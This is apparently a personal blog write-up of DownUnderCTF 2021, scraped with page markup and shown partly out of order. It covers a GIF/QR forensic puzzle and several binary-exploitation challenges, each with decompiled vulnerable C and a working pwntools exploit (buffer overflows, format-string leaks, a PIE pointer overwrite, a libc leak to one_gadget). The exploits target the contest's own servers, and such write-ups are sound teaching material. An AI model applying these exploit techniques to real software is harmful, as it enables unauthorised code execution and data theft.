&quot;/dev/urandom&quot; when i input the number 1337, the program will lead me to a function called game, also there are 2 functions called. Ok, there are 2 more functions i need to check, the set_username and print_username. size_t set_username() { FILE *v0; // rbx size_t v1; // rax puts(&quot;What would you like to change your username to?&quot;); v0 = stdin; v1 = strlen(NAME); return fread(NAME, 1uLL, v1, v0); } nt print_username() { return puts(NAME); } Hmm, now that the vulnerability showed up, at first the program asked me to input 32 byte which filled up the NAME buffer entirely, no nullbyte between RANDBUF and NAME, so when the program call print_username it will call puts function it will print not only my input but also leak the address of RANDBUF, it means i leaked PIE. The set_username read my into NAME buffer with the length is the return value of strlen(NAME) function, the strlen function only stop counting when it reach the nullbyte, but before this i’ve already filled up the NAME buffer entirely with 32 bytes, which means the strlen will now read 6 more bytes (length of RANDBUF’s address) because there are no nullbyte between them, then i’ll be able to input 32 + 6 = 38 bytes, enough to overwrite the address of RANDBUF. Now let’s checkout the mysterious game function: unsigned __int64 game() { FILE *stream; // [rsp+8h] [rbp-18h] int ptr; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); stream = fopen(RANDBUF, &quot;rb&quot;); fread(&amp;ptr, 1uLL, 4uLL, stream); printf(&quot;guess: &quot;); if ( get_num() == ptr ) system(&quot;/bin/sh&quot;); return v3 - __readfsqword(0x28u); } The program will open RANDBUF (RANDBUF = /dev/urandom) to read the first 4 bytes of it, if i could guess those 4 bytes correctly i’ll have a shell. But why do i have to guess, when i can just overwrite the RANDBUF pointer, so where do i overwrite RANDBUF buffer to point to? I will overwrite it to point right back at the beginning of the NAME buffer, and i use function set_username to both rewriting NAME buffer from garbage into &quot;flag.txt\\0&quot; and overwriting the RANDBUF pointer, the first 4 bytes of flag.txt is always DUCT (0x54435544 in little-endian hexa), that’s a free shell isn’t it? Here’s my exploit: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31907) #io = process(&#39;./babygame&#39;) print(io.recv()) payload = b&#39;A&#39;*40 io.sendline(payload) print(io.recvuntil(&#39;&gt; &#39;)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;2&#39;) io.recv(32) leak = u64(io.recv(6)+b&#39;\\0\\0&#39;) + 8316 print(hex(leak)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;1&#39;) print(io.recv()) payload = b&#39;flag.txt&#39;+b&#39;\\0&#39;*24+p64(leak) io.sendline(payload) print(io.recvuntil(&#39;&gt; &#39;)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;1337&#39;) print(io.recv()) io.sendline(&#39;1413698884&#39;) io.interactive() Flag: DUCTF{whats_in_a_name?_5aacfc58} Oversight This challenge is funny, don’t know why but i like it, i also like a heapnote challenge, but somehow i couldnt do it in time, too stupid maybe? Dunno =]] int wait() { unsigned int v0; // eax char s[5]; // [rsp+Bh] [rbp-85h] BYREF char format[120]; // [rsp+10h] [rbp-80h] BYREF puts(&quot;Press enter to continue&quot;); getc(stdin); printf(&quot;Pick a number: &quot;); fgets(s, 5, stdin); v0 = strtol(s, 0LL, 10); snprintf(format, 0x64uLL, &quot;Your magic number is: %%%d$llx\\n&quot;, v0); printf(format); return introduce(); } int introduce() { puts(&quot;Are you ready to echo?&quot;); get_num_bytes(); return puts(&quot;That was fun!&quot;); } int get_num_bytes() { unsigned int v0; // eax int result; // eax char s[13]; // [rsp+Bh] [rbp-15h] BYREF printf(&quot;How many bytes do you want to read (max 256)? &quot;); fgets(s, 5, stdin); v0 = strtol(s, 0LL, 10); if ( v0 &gt; 0x100 ) result = puts(&quot;Don&#39;t break the rules!&quot;); else result = echo(v0); return result; } The program first have format string vulnerability to leak data, which i used to leak libc, when finished leaking libc i overwrite the return pointer of get_num_bytes function to return to the one_gadget in libc by stack spraying technique, sometimes it doesn’t work, so if the shell doesn’t pop up just retry a few times, this is my script: from pwn import * #io = process(&#39;./oversight&#39;, env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;}) libc = ELF(&#39;./libc-2.27.so&#39;) io = remote(&#39;pwn-2021.duc.tf&#39;, 31909) print(io.recv()) io.send(b&#39;\\n&#39;) print(io.recv()) io.sendline(b&#39;15&#39;) print(io.recvuntil(b&#39;Your magic number is: &#39;)) libc.address = int(io.recvline(), 16) - 0x8d4d3 print(io.recv()) payload = p64(libc.address+0x4f432)*25 + 6*b&#39;\\0\\0\\0\\0\\0\\0\\0\\0&#39; +b&#39;BBBBBBB&#39; io.sendline(&#39;256&#39;) io.sendline(payload) print(io.recv()) io.interactive() Flag: DUCTF{1_sm@LL_0ver5ight=0v3rFLOW} Thanks for reading my boring writeup, have a good day fellas =]]","@type":"BlogPosting","url":"https://th3-5had0w.github.io/2021/09/27/downunderctf-2021.html","headline":"DownUnderCTF2021 Writeups","dateModified":"2021-09-27T00:00:00+00:00","datePublished":"2021-09-27T00:00:00+00:00","author":{"@type":"Person","name":"th3_5had0w"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://th3-5had0w.github.io/2021/09/27/downunderctf-2021.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://th3-5had0w.github.io/feed.xml" title="th3_5had0w" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">th3_5had0w<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/th3_5had0w_w"><i class="fab fa-twitter-square"></i></a><a class="color-purple-hover" href="https://github.com/th3-5had0w"><i class="fab fa-github-square"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="
            https://gravatar.com/avatar/4241e14141109999e63e51ba2f6eac59?s=256
        " class="author-avatar" alt="Avatar" />
    
Hi, i'm th3_5had0w, nice to meet you, welcome to my darkness kingdom, where i often solve math problems and play ctf!

</div>


<div class="post">
  <h1 class="post-title">DownUnderCTF2021 Writeups</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/pwn/">pwn</a>
      
  </div>
  
  <div class="post-date">Published on 27 Sep 2021</div>
  
  <p>DownunderCTF, the challenges were good i think, i spent my weekend playing this, but a little disappointed that i didn’t solve the heap note challenge in-time, i guess “emyeuheappwn” but “heappwnkhongyeuem” hehe… enough joking, let’s get started.</p>

<p>To warm up things a little bit i’ll start with a basic forensic challenge that i think was pretty fun.</p>

<h1 id="how-to-pronounce-gif">How to pronounce GIF?</h1>

<p>The challenge provided us a <a href="https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/misc/challenge.gif">GIF image</a> which each of its frame is a part of some kind of QRCodes.</p>

<p><img src="https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/misc/challenge.gif" alt="" /></p>

<p>First i used <a href="https://ezgif.com/split">online service</a> to split GIF into image frames.</p>

<p>After scrolling through the image frames for a while, i realized there are 10 QRCode, each of those QRCodes was splitted into 11 parts. So i wrote a script to merge those splitted part together, and this is it:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>


<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
    <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ni</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">'RGB'</span><span class="p">,</span> <span class="p">(</span><span class="mi">300</span><span class="p">,</span> <span class="mi">22</span><span class="o">*</span><span class="mi">12</span><span class="p">),</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span>

    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_00'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_01'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_02'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_03'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_04'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_05'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_06'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_07'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_08'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_09'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_10'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">image0</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'frame_11'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">'_delay-0.05s.png'</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span>
    <span class="n">pos</span><span class="o">+=</span><span class="mi">21</span>
    <span class="n">image0</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s">"dat"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s">".png"</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"PNG"</span><span class="p">)</span>
    <span class="n">ni</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Run this script and i have 10 qrcode, so i just have to scan these:</p>

<p>Many of them were just garbages, and a rickroll link ヽ( ಠ益ಠ )ﾉ, nothing interesting, but then i saw there are 2 weird strings:</p>

<p><code class="language-plaintext highlighter-rouge">RFVDVEZ7YU1</code> and <code class="language-plaintext highlighter-rouge">fMV9oYVhYMHJfbjB3P30=</code></p>

<p>i immediately realized these are two parts of a 64base encode, so i put them together, decoded it and got the flag:
<code class="language-plaintext highlighter-rouge">DUCTF{aM_1_haXX0r_n0w?}</code></p>

<h1 id="deadcode">Deadcode</h1>

<p><a href="https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/deadcode/deadcode">This challenge</a> is a basic buffer overflow challenge.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF</span>
  <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">buffer_init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">What features would you like to see in my app?"</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">==</span> <span class="mh">0xDEADC0DELL</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Maybe this code isn't so dead..."</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The program use the vulnerable function gets to get user data, so i just need to fill enough padđing and overwrite v5 variable with value <code class="language-plaintext highlighter-rouge">0xdeadc0de</code>, here is my exploit script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadc0de</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn-2021.duc.tf'</span><span class="p">,</span> <span class="mi">31916</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</code></p>

<h1 id="leaking-like-a-sieve">Leaking like a sieve</h1>

<p><a href="https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/leaking/hellothere">This challenge</a> is a basic format string challenge.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-58h]</span>
  <span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-50h] BYREF</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-30h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-8h]</span>

  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">buffer_init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"./flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">stream</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"The flag file isn't loading. Please contact an organiser if you are running this on the shell server."</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"What is your name?"</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Hello there, "</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
    <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The flag was loaded in already before we could input anything, also, the program uses printf without format specifier but pass in our input directly, so it would just be so easy to leak the flag in just one shot, here’s my exploit script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn-2021.duc.tf'</span><span class="p">,</span> <span class="mi">31918</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'%6$s'</span>

<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Hello there, '</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{f0rm4t_5p3c1f13r_m3dsg!}</code></p>

<h1 id="outbackdoor">Outbackdoor</h1>

<p><a href="https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/outdoor/outBackdoor">This challenge</a> is still a classical buffer overflow challenge, but this time i’ll overwrite the return pointer instead of overwriting some variable.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>

  <span class="n">buffer_init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Fool me once, shame on you. Fool me twice, shame on me."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Seriously though, what features would be cool? Maybe it could play a song?"</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">...</span>

<span class="kt">int</span> <span class="nf">outBackdoor</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">W...w...Wait? Who put this backdoor out back here?"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So i just need to padding enough to where the return pointer address was and overwrote it, then it’s done, my exploit script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn-2021.duc.tf'</span><span class="p">,</span> <span class="mi">31921</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011d7</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}</code></p>

<h1 id="babygame">Babygame</h1>

<p>Now this is a good <a href="https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/babygame/babygame">challenge</a>, not hard but really interesting tho.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>

  <span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome, what is your name?"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">NAME</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
  <span class="n">RANDBUF</span> <span class="o">=</span> <span class="s">"/dev/urandom"</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">print_menu</span><span class="p">();</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">1337</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">game</span><span class="p">();</span>
    <span class="p">}</span>
